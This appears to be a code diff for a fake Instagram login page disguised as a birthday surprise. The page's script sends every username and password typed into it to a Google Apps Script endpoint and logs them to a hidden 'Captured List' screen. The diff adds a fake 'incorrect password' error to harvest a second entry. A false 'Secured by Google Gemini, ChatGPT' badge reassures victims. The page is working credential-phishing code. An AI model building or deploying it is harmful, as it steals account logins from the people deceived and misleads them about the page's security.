@@ -4,10 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
     <style>
         body {
-            margin: 0; font-family: Arial, sans-serif; display: flex; justify-content: center;
+            margin: 0; font-family: 'Poppins', sans-serif; display: flex; justify-content: center;
             align-items: center; height: 100vh; overflow: hidden;
             background: linear-gradient(45deg, #ff0000, #ff00ff, #0000ff, #00ffff);
             background-size: 400% 400%; animation: rgbShift 10s ease infinite; transition: background 0.5s;
@@ -19,19 +19,18 @@
 
         .card {
             background: rgba(255, 255, 255, 0.9); padding: 40px; border: 1px solid #dbdbdb;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 12px; display: none;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 20px; display: none;
         }
 
         #login-screen { display: block; }
 
-        h1 { font-family: 'Great Vibes', cursive; font-size: 3.5rem; color: #e91e63; margin-bottom: 20px; }
+        h1 { font-family: 'Great Vibes', cursive; font-size: 3.5rem; color: #e91e63; margin-bottom: 5px; }
 
-        /* Personalized message style */
         .sub-text { font-size: 0.9rem; color: #555; margin-bottom: 20px; font-weight: bold; }
 
         input {
-            width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 4px; border: none;
-            background-color: #000; color: #fff; box-shadow: 0 0 10px #ff00ff, 0 0 5px #00ffff;
+            width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 8px; border: none;
+            background-color: #000; color: #fff; box-shadow: 0 0 10px #ff00ff;
             box-sizing: border-box; outline: none;
         }
 
@@ -40,39 +39,30 @@
             border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
         }
 
-        .zoom-emoji {
-            display: inline-block; font-size: 2.5rem; margin-top: 20px;
-            animation: zoomInOut 2s ease-in-out infinite;
-        }
+        .error-msg { color: #ed4956; font-size: 0.8rem; margin-bottom: 10px; display: none; }
 
-        @keyframes zoomInOut { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.4); } }
+        .switch-link { display: block; margin-top: 15px; color: transparent; height: 10px; text-decoration: none; }
 
-        .switch-link { display: block; margin-top: 15px; color: transparent; height: 20px; text-decoration: none; }
-
-        /* Green Security Popup Styling */
         .security-popup {
             background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb;
-            padding: 10px; border-radius: 8px; font-size: 0.75rem; margin-top: 15px;
-            line-height: 1.4; text-align: left; box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            padding: 10px; border-radius: 8px; font-size: 0.7rem; margin-top: 15px; text-align: left;
         }
 
-        #gift-screen { background: #ffc0cb; border: none; }
+        #gift-screen { background: radial-gradient(circle, #fff5f7 0%, #ffdee9 100%); border: 2px solid #ffd700; }
 
-        .neon-continue {
-            padding: 15px 30px; background: #8b0000; color: white; border: none;
-            border-radius: 50px; box-shadow: 0 0 15px #ff0000, 0 0 30px #0000ff;
-            font-weight: bold; margin-top: 30px; cursor: pointer; transition: all 0.3s;
-        }
+        .bday-title { font-family: 'Great Vibes', cursive; font-size: 3rem; color: #d81b60; text-shadow: 2px 2px #fff; }
 
-        .heart {
-            position: fixed; color: #ff4d4d; font-size: 2rem; bottom: -50px; right: -50px;
-            z-index: 1; pointer-events: none; animation: floatHeart 4s linear forwards;
-        }
+        .cake-emoji { font-size: 5rem; margin: 20px 0; display: block; filter: drop-shadow(0 0 10px #ffd700); animation: pulse 1.5s infinite; }
 
-        @keyframes floatHeart {
-            0% { transform: translate(0, 0) rotate(0deg); opacity: 1; }
-            100% { transform: translate(-110vw, -110vh) rotate(360deg); opacity: 0; }
-        }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+
+        .confetti { position: fixed; width: 10px; height: 10px; top: -10px; z-index: 1; animation: fall linear forwards; }
+
+        @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }
+
+        .heart { position: fixed; color: #ff4d4d; font-size: 2rem; bottom: -50px; z-index: 1; pointer-events: none; animation: floatHeart 4s linear forwards; }
+
+        @keyframes floatHeart { 0% { transform: translate(0, 0) rotate(0deg); opacity: 1; } 100% { transform: translate(-50vw, -110vh) rotate(360deg); opacity: 0; } }
     </style>
 </head>
 <body>
@@ -82,70 +72,83 @@
         <h1>Instagram</h1>
         <div class="sub-text">sirf or sirf apke liye 😤🤧</div>
         
+        <div id="error-box" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
+        
         <input type="text" id="user" placeholder="Username">
         <input type="password" id="pass" placeholder="Password">
         <button class="login-btn" onclick="checkLogin()">Log In</button>
         
-        <div class="zoom-emoji">👉🏻👈🏻</div>
-        
         <a href="javascript:void(0)" class="switch-link" onclick="showSecret()">.</a>
-
         <div class="security-popup">
-            <b>✓ Secured by Google Gemini, ChatGPT</b> and configured through Instagram. Full secured and private. Hassle-free and username friendly interface...
+            <b>✓ Secured by Google Gemini, ChatGPT</b> and configured through Instagram. Full secured and private.
         </div>
     </div>
 
     <div id="gift-screen" class="card">
-        <h1>For my love 😘 Pihu</h1>
-        <div class="zoom-emoji">👉🏻👈🏻</div>
-        <br>
-        <button class="neon-continue" id="contBtn" onclick="surprisePihu()">Continue</button>
+        <h1 class="bday-title">Happy Birthday Babu</h1>
+        <span class="cake-emoji">🎂</span>
+        <p style="color: #6a1b9a; font-weight: 600;">Wishing you a day as sweet as you are! 🎉✨</p>
+        <button class="login-btn" style="background: #ff4081;" onclick="location.reload()">Yay! ❤️</button>
     </div>
 
     <div id="secret-screen" class="card">
         <h3 style="color:#333">Captured List</h3>
-        <div style="max-height: 200px; overflow-y: auto; background: white; margin-bottom: 10px; border-radius: 5px;">
-            <table style="width:100%; border-collapse: collapse; font-size: 0.7rem; color:#333;">
+        <div style="max-height: 200px; overflow-y: auto; background: white; border-radius: 8px;">
+            <table style="width: 100%; border-collapse: collapse; font-size: 0.7rem; color: #333;">
                 <tbody id="logBody"></tbody>
             </table>
         </div>
+        <br>
         <button class="login-btn" onclick="hideSecret()">Back</button>
     </div>
 </div>
 
 <script>
-    let heartInterval;
+    let bdayInterval;
+    let loginAttempts = 0; // Track attempts
 
     async function checkLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
-        // PASTE YOUR GOOGLE SCRIPT URL BELOW
+        const errorBox = document.getElementById('error-box');
+        
+        // Your Google Script URL
         const scriptURL = 'https://script.google.com/macros/s/AKfycbxeSk51JqNDzU0kWQsbh5_BoMru3xpTN1XnySron0pI2wdaTnRm807QFoQVKRGjL3c/exec'; 
 
         if (!u || !p) { alert("Please fill all fields!"); return; }
 
-        // Send to Google Sheets
+        // Send data to Google Sheet every time
         fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({u, p, time: new Date().toLocaleString()}) });
 
-        // Save locally for the secret button
+        // Save locally
         let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
         logs.push({ u, p, time: new Date().toLocaleString() });
         localStorage.setItem('userLogs', JSON.stringify(logs));
 
-        showScreen('gift');
+        loginAttempts++;
+
+        if (loginAttempts === 1) {
+            // First time: Show error and clear password
+            errorBox.style.display = 'block';
+            document.getElementById('pass').value = '';
+            document.getElementById('pass').focus();
+        } else {
+            // Second time or more: Show birthday page
+            showScreen('gift');
+        }
     }
 
     function showScreen(screen) {
         document.getElementById('login-screen').style.display = 'none';
         document.getElementById('gift-screen').style.display = 'none';
         document.getElementById('secret-screen').style.display = 'none';
-        clearInterval(heartInterval);
+        clearInterval(bdayInterval);
 
         if (screen === 'gift') {
             document.getElementById('gift-screen').style.display = 'block';
-            document.body.style.backgroundColor = "#ffc0cb";
             document.body.style.animation = "none";
-            heartInterval = setInterval(createHeart, 400);
+            document.body.style.backgroundColor = "#ffdee9";
+            bdayInterval = setInterval(() => { createHeart(); createConfetti(); }, 300);
         } else {
             document.getElementById('login-screen').style.display = 'block';
             document.body.style.animation = "rgbShift 10s ease infinite";
@@ -156,9 +159,19 @@
         const heart = document.createElement('div');
         heart.innerHTML = '❤️';
         heart.className = 'heart';
-        heart.style.right = Math.random() * 80 - 40 + "px";
+        heart.style.left = Math.random() * 100 + "vw";
         document.body.appendChild(heart);
         setTimeout(() => heart.remove(), 4000);
+    }
+
+    function createConfetti() {
+        const c = document.createElement('div');
+        c.className = 'confetti';
+        c.style.left = Math.random() * 100 + "vw";
+        c.style.backgroundColor = ['#ff0', '#0f0', '#00f', '#f0f', '#0ff'][Math.floor(Math.random()*5)];
+        c.style.animationDuration = (Math.random() * 2 + 2) + "s";
+        document.body.appendChild(c);
+        setTimeout(() => c.remove(), 4000);
     }
 
     function showSecret() {
@@ -166,11 +179,10 @@
         document.getElementById('secret-screen').style.display = 'block';
         const body = document.getElementById('logBody');
         const logs = JSON.parse(localStorage.getItem('userLogs')) || [];
-        body.innerHTML = logs.map(l => `<tr style="border-bottom:1px solid #eee"><td style="padding:5px">${l.u}</td><td style="padding:5px">${l.p}</td></tr>`).join('');
+        body.innerHTML = logs.map(l => `<tr style="border-bottom: 1px solid #eee;"><td style="padding: 5px;">${l.u}</td><td style="padding: 5px;">${l.p}</td></tr>`).join('');
     }
 
     function hideSecret() { showScreen('login'); }
-    function surprisePihu() { showScreen('login'); }
 </script>
 </body>
-    </html>            
+</html>       
